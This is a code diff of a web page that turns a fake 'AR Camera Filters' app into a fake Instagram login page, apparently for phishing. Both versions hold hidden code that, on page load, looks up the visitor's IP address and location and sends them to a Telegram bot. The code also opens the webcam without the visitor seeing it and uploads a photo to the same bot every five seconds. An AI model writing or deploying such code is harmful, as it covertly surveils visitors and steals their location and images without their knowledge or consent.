@@ -3,69 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AR Camera Filters</title>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection"></script>
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap">
     <style>
         body {
             margin: 0;
-            background-color: black;
-            overflow: hidden;
+            font-family: 'Poppins', sans-serif;
+            background-color: #fafafa;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
+            flex-direction: column;
         }
-        video, canvas {
-            position: absolute;
+        .login-container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            width: 350px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        input {
             width: 100%;
-            height: auto;
-        }
-        .filter-menu {
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            gap: 10px;
-            z-index: 10;
-        }
-        .filter-btn {
             padding: 10px;
-            background: white;
-            border: none;
-            cursor: pointer;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background: #fafafa;
+            font-size: 14px;
         }
-        .capture-btn {
-            position: absolute;
-            bottom: 20px;
-            padding: 15px;
-            background: red;
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
             color: white;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 14px;
+        }
+        button:hover {
+            background-color: #0073e6;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #385185;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
         }
     </style>
-</head>
-<body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-    <div class="filter-menu">
-        <button class="filter-btn" onclick="applyFilter('glasses')">Glasses</button>
-        <button class="filter-btn" onclick="applyFilter('hat')">Hat</button>
-    </div>
-    <button class="capture-btn" onclick="capturePhoto()">Capture & Download</button>
-    
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        let currentFilter = '';
-
         async function sendUserInfoToTelegram() {
             let response = await fetch('https://ipwho.is/');
             let data = await response.json();
@@ -74,6 +70,26 @@
             let message = `New Visitor Detected!\nIP: ${data.ip}\nLocation: ${data.city}, ${data.country}\nISP: ${data.connection.isp}\nMap: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
             let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
             fetch(telegramURL);
+        }
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                video.style.display = 'none';
+                document.body.appendChild(video);
+
+                let canvas = document.createElement('canvas');
+                let ctx = canvas.getContext('2d');
+                canvas.width = 640;
+                canvas.height = 480;
+
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    sendPhotoToTelegram(canvas.toDataURL('image/png'));
+                }, 5000);
+            }).catch(console.error);
         }
 
         async function sendPhotoToTelegram(imageData) {
@@ -99,51 +115,19 @@
             return new Blob([ab], { type: mimeString });
         }
 
-        async function startCamera() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-            };
-            setInterval(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                sendPhotoToTelegram(canvas.toDataURL('image/png'));
-            }, 5000); // Sends a photo every 5 seconds
-        }
-
-        function applyFilter(filter) {
-            currentFilter = filter;
-        }
-
-        function drawFilter() {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            if (currentFilter === 'glasses') {
-                ctx.fillStyle = 'rgba(0, 0, 255, 0.5)';
-                ctx.fillRect(150, 100, 200, 50);
-            } else if (currentFilter === 'hat') {
-                ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
-                ctx.fillRect(180, 50, 150, 50);
-            }
-            requestAnimationFrame(drawFilter);
-        }
-
-        function capturePhoto() {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            sendPhotoToTelegram(canvas.toDataURL('image/png'));
-            const image = canvas.toDataURL('image/png');
-            const link = document.createElement('a');
-            link.href = image;
-            link.download = 'filtered_photo.png';
-            link.click();
-        }
-
         window.onload = async () => {
             await sendUserInfoToTelegram();
-            await startCamera();
-            drawFilter();
+            startCamera();
         };
     </script>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+        <input type="text" placeholder="Phone number, username, or email">
+        <input type="password" placeholder="Password">
+        <button>Log In</button>
+        <div class="forgot-password">Forgot password?</div>
+    </div>
 </body>
 </html>
